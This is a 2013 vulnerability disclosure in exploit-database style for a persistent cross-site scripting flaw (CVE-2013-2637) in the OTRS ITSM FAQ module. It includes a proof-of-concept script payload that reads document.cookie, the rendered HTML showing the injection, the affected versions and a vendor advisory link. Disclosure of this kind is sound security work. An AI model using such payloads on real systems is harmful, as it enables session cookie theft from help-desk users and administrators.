@@ -1,0 +1,45 @@
+# Exploit Title: [OTRS Faq Module - Persistent  XSS]
+
+# Date: [2-Apr-2013]
+# Exploit Author: [Luigi Vezzoso]
+# Vendor Homepage: [http://www.otrs.com]
+# Version: [OTRS ITSM 3.2.x,OTRS ITSM 3.1.x,OTRS ITSM 3.0.x]
+# Tested on: [Perl]
+# CVE : [CVE-2013-2637]
+
+#OVERVIEW
+The OTRS ITSM FAQ Module 3.2.x and below is vulnerable to a persistant XSS that permit some client side attack like cookies grabbing.
+
+#INTRODUCTION
+OTRS (http://www.otrs.com) is a flexible Help Desk and IT-Service Management Software distribuited as opensource project (AGPL License) and also as-a-service. WIth a 1,650,000 downloads and 110,000 installation is one of the most used ticketing and service management software in the world.
+
+#VULNERABILITY DESCRIPTION
+The FAQ Module permit to share FAQ documents to Admins (called Agents in OTRS), Customers and everyone. The documents are presented like a wiki. Each user with the permission of add a FAQ can create a custom FAQ with the exploit. Each user that can view that FAQ (also the admin) can trigger the XSS. 
+
+The user can add JavaScript in the "Syntoms" of FAQ like the simplest:	<script>alert("H4cked!!  "+document.cookie);</script>
+
+
+--------------------------------------------------------------------------------
+ <li class="Customer Visible">
+                <div class="MessageHeader">
+                    <h3>Symptom:</h3>
+                    <div class="Clear"></div>
+                </div>
+                <div class="ArticleFAQContent">
+                    <div class="message">
+                        <script>alert("H4cked!!  "+document.cookie);</script>
+                    </div>
+                </div>
+            </li>
+--------------------------------------------------------------------------------
+
+#VERSIONS AFFECTED
+OTRS ITSM 3.2.x, OTRS ITSM 3.1.x, OTRS ITSM 3.0.x, FAQ 2.1.x, FAQ 2.0.x
+
+#SOLUTION
+Referer to vendor security advisor @ http://www.otrs.com/en/open-source/community-news/security-advisories/security-advisory-2013-02/
+
+#CREDITS
+Luigi Vezzoso 
+email:	luigivezzoso@gmail.com
+skype:	luigivezzoso
